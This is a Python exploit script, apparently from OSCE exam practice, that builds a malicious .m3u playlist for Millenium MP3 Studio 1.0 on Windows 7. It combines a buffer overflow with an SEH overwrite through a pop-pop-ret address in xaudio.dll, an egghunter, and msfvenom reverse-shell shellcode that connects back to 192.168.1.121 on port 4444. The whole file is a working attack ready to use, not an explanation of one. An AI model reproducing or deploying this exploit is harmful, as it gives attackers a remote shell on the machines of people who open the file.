#!/usr/bin/python 
# Millenium MP3 Studio 1.0 Windows 7 SP1  exploit

filename = "Z:\OSCE\ExtraMile\MilleniumMP3Studio1.0\evil.m3u"

# Egghunter , tag suls  
egghunter= "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x73\x75\x6c\x73\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" 

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=192.168.1.121 -b "\x00\xcc" -a x86 -f python -e x86/alpha_mixed 
buf =  ""
buf += "\x89\xe2\xda\xdf\xd9\x72\xf4\x5d\x55\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x7a\x48\x6b"
buf += "\x32\x43\x30\x35\x50\x65\x50\x61\x70\x4b\x39\x38\x65"
buf += "\x34\x71\x59\x50\x43\x54\x4e\x6b\x50\x50\x54\x70\x6e"
buf += "\x6b\x72\x72\x74\x4c\x6e\x6b\x73\x62\x55\x44\x4c\x4b"
buf += "\x43\x42\x46\x48\x46\x6f\x38\x37\x43\x7a\x31\x36\x65"
buf += "\x61\x49\x6f\x6c\x6c\x37\x4c\x53\x51\x51\x6c\x54\x42"
buf += "\x36\x4c\x45\x70\x6f\x31\x7a\x6f\x44\x4d\x65\x51\x6a"
buf += "\x67\x78\x62\x39\x62\x63\x62\x71\x47\x4e\x6b\x71\x42"
buf += "\x56\x70\x4c\x4b\x61\x5a\x47\x4c\x6c\x4b\x72\x6c\x66"
buf += "\x71\x52\x58\x6b\x53\x47\x38\x66\x61\x6e\x31\x32\x71"
buf += "\x6e\x6b\x33\x69\x71\x30\x66\x61\x39\x43\x6c\x4b\x31"
buf += "\x59\x32\x38\x49\x73\x77\x4a\x73\x79\x6c\x4b\x65\x64"
buf += "\x4e\x6b\x63\x31\x59\x46\x55\x61\x59\x6f\x6c\x6c\x39"
buf += "\x51\x4a\x6f\x36\x6d\x56\x61\x4f\x37\x30\x38\x59\x70"
buf += "\x62\x55\x5a\x56\x65\x53\x61\x6d\x79\x68\x55\x6b\x51"
buf += "\x6d\x77\x54\x30\x75\x69\x74\x50\x58\x4c\x4b\x53\x68"
buf += "\x67\x54\x37\x71\x5a\x73\x50\x66\x6c\x4b\x76\x6c\x32"
buf += "\x6b\x6c\x4b\x33\x68\x55\x4c\x36\x61\x49\x43\x6e\x6b"
buf += "\x44\x44\x4e\x6b\x76\x61\x7a\x70\x4e\x69\x47\x34\x66"
buf += "\x44\x76\x44\x71\x4b\x51\x4b\x55\x31\x70\x59\x70\x5a"
buf += "\x46\x31\x79\x6f\x6d\x30\x53\x6f\x51\x4f\x42\x7a\x6e"
buf += "\x6b\x72\x32\x38\x6b\x6e\x6d\x73\x6d\x35\x38\x56\x53"
buf += "\x45\x62\x67\x70\x45\x50\x65\x38\x73\x47\x31\x63\x66"
buf += "\x52\x33\x6f\x36\x34\x53\x58\x32\x6c\x34\x37\x47\x56"
buf += "\x45\x57\x69\x6f\x78\x55\x78\x38\x7a\x30\x67\x71\x67"
buf += "\x70\x37\x70\x61\x39\x7a\x64\x66\x34\x62\x70\x73\x58"
buf += "\x36\x49\x6d\x50\x72\x4b\x53\x30\x69\x6f\x78\x55\x32"
buf += "\x70\x66\x30\x46\x30\x72\x70\x53\x70\x36\x30\x53\x70"
buf += "\x66\x30\x45\x38\x7a\x4a\x76\x6f\x39\x4f\x4b\x50\x39"
buf += "\x6f\x48\x55\x4a\x37\x53\x5a\x33\x35\x53\x58\x39\x50"
buf += "\x49\x38\x35\x51\x61\x69\x70\x68\x33\x32\x35\x50\x76"
buf += "\x71\x71\x4c\x6c\x49\x68\x66\x30\x6a\x76\x70\x63\x66"
buf += "\x31\x47\x73\x58\x6d\x49\x4e\x45\x52\x54\x45\x31\x39"
buf += "\x6f\x79\x45\x6c\x45\x49\x50\x32\x54\x34\x4c\x49\x6f"
buf += "\x70\x4e\x74\x48\x34\x35\x4a\x4c\x72\x48\x6a\x50\x78"
buf += "\x35\x39\x32\x62\x76\x49\x6f\x4b\x65\x65\x38\x51\x73"
buf += "\x42\x4d\x62\x44\x65\x50\x4e\x69\x7a\x43\x51\x47\x71"
buf += "\x47\x53\x67\x30\x31\x5a\x56\x62\x4a\x42\x32\x56\x39"
buf += "\x73\x66\x59\x72\x6b\x4d\x53\x56\x78\x47\x47\x34\x46"
buf += "\x44\x57\x4c\x46\x61\x47\x71\x4e\x6d\x51\x54\x37\x54"
buf += "\x34\x50\x78\x46\x67\x70\x70\x44\x52\x74\x42\x70\x52"
buf += "\x76\x31\x46\x63\x66\x73\x76\x50\x56\x62\x6e\x52\x76"
buf += "\x51\x46\x32\x73\x73\x66\x33\x58\x44\x39\x48\x4c\x67"
buf += "\x4f\x4e\x66\x49\x6f\x39\x45\x4c\x49\x6d\x30\x32\x6e"
buf += "\x32\x76\x51\x56\x4b\x4f\x34\x70\x75\x38\x65\x58\x6f"
buf += "\x77\x47\x6d\x63\x50\x49\x6f\x6e\x35\x6d\x6b\x68\x70"
buf += "\x6f\x45\x69\x32\x76\x36\x32\x48\x6c\x66\x4f\x65\x6f"
buf += "\x4d\x6d\x4d\x79\x6f\x7a\x75\x47\x4c\x57\x76\x63\x4c"
buf += "\x75\x5a\x4b\x30\x6b\x4b\x6b\x50\x54\x35\x66\x65\x4d"
buf += "\x6b\x63\x77\x67\x63\x73\x42\x42\x4f\x63\x5a\x75\x50"
buf += "\x50\x53\x39\x6f\x78\x55\x41\x41"

buffer = "http://"
buffer += "sulssuls" # Egg Hunter Tag 
buffer += buf # Payload 
buffer += "A" * (4103 - 8 - len(buf))
buffer += "\xeb\x22\x90\x90" # Jmp forward 
buffer += "\xae\x03\x01\x10"  # PPR in xaudio.dll
buffer += "\x90" * 30 
buffer += egghunter 
buffer += "D" * (5000-4103-4-4-30-len(egghunter) )
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
